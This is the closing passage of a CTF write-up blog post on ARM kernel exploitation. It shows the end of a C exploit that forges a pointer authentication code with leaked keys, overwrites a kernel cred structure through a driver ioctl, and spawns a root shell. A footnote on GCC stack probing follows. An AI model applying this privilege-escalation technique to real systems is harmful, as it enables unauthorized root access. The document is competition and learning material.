    puts("[-] Bad luck: Key not found");
    exit(1);
  }

  /* Prepare payload */
  memset(data.buffer, 'A', sizeof(data.buffer));
  data.length = 0x400;
  data.op_index = 0;
  data.offset = 0;
  assert (ioctl(fd, 0x40046b03, &data) >= 0);

  /* Overwrite PAC pointer */
  size_t target = rop_str_x2_px3; // AAW
  printf("0x%016lx\n", target);
  pac = ~pauth_computepac_architected(target, 0, key0, key1);
  data.length = 0x408;
  data.op_index = 0;
  data.offset = (pac & 0xffff000000000000) | (target & 0xffffffffffff);
  assert (ioctl(fd, 0x40046b03, &data) >= 0);
  getchar();

  /* Overwrite cred */
  puts("[+] Overwriting cred");
  for (size_t i = 0; i < 4; i++) {
    data.length = 0;
    data.op_index = 0;
    data.offset = cred + 8*i;
    assert (ioctl(fd, 0x40046b03, &data) >= 0);
  }

  puts("[+] Done!");
  system("/bin/sh");

  close(fd);
  return 0;
}
```

Big thanks to [Itarow](https://x.com/0xItarow) for creating this challenge. I learned a lot about PAC and ARM kernel exploitation!

[\*1](#fn-6aef2a88):Normally, [GCC](https://d.hatena.ne.jp/keyword/GCC) inserts a write loop after alloca to prevent this kind of attack by triggering a page fault early. However, in this case, the program didn’t have such a guard—probably because the author disabled it via a compiler flag or used a different compiler altogether.


[« 
Dirty Pageflags: Revisiting PTE Exploit…](https://ptr-yudai.hatenablog.com/entry/2025/09/14/180326)

[KalmarCTF 2025 Writeup
 »](https://ptr-yudai.hatenablog.com/entry/2025/03/10/123050)